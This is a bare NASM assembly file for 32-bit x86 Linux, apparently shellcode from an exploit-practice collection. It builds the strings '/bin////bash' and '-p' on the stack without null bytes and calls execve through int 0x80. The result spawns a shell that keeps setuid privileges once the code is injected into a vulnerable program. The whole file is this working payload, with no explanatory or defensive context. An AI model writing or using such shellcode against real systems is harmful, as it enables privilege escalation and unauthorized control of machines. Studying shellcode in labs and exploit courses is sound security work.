section .text
	global _start

    %include "../../../utils_linux_x86.asm"

_start:

    xor    eax, eax
    mov    al, 0xff
    sub    esp, eax

    xor    eax, eax
    push   eax
    push   'bash'
    push   '////'
    push   '/bin'
    mov    ebx, esp


    push   eax
    push   word '-p'
    mov    ecx, esp
    push   eax
    push   ecx
    push   ebx

    mov    ecx, esp
    mov    edx, eax
    mov    al, SYS_EXECV
    int    0x80
